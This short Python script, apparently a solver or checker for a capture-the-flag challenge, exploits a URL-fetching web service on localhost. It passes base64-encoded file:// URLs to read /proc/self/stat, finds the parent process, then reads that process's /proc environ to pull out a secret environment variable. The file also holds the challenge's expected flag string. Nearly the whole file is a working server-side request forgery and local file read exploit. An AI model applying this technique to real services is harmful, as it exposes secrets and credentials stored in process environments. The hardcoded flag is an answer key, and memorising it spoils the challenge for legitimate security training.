#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from pwn import *
import json
import base64

target = 'http://localhost:1337/read/'

def gen_target(curl_url):
	payload = { 'url': curl_url }
	return target + base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8')

def get_text_between(haystack, start_delim, end_delim):
	return haystack.split(start_delim, 1)[1].split(end_delim, 1)[0]


result = wget(gen_target('file:///proc/self/stat'))
stat = get_text_between(result, b'class=&quot;page&quot;&gt;', b'&lt;/div&gt;"').decode('unicode_escape')
ppid = stat.split(' ', 4)[3]

environ = wget(gen_target('file:///proc/{}/environ'.format(ppid)))
flag = get_text_between(environ, b'FLAG=', b'}').decode('unicode_escape') + "}"

if flag == "sdctf{CURL_up_aNd_L0c@L_F1le_incLuSi0N}":
    exit(0)

exit(1)
